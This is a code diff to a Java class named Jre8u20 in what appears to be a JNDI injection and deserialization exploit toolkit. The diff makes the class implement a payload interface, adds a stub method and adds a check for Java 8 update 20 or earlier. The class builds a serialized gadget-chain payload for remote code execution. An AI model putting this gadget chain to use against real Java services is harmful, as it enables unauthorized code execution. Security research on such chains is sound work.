@@ -2,6 +2,7 @@ package com.nu1r.jndi.gadgets;
 
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.utils.Gadgets;
+import com.nu1r.jndi.gadgets.utils.JavaVersion;
 import com.nu1r.jndi.gadgets.utils.Reflections;
 import com.nu1r.jndi.gadgets.utils.Util;
 
@@ -14,9 +15,9 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.LinkedHashSet;
 
-public class Jre8u20 {
+public class Jre8u20 implements ObjectPayload<Object>{
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         final Object templates       = Gadgets.createTemplatesImpl(type, param);
         String       zeroHashCodeStr = "f5a5a608";
 
@@ -154,5 +155,15 @@ public class Jre8u20 {
         bytes = Util.addAtLast(bytes, (byte) 0x78);
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
+    }
+
+    public static boolean isApplicableJavaVersion() {
+        JavaVersion v = JavaVersion.getLocalVersion();
+        return (v != null && (v.major < 8 || (v.major == 8 && v.update <= 20)));
     }
 }
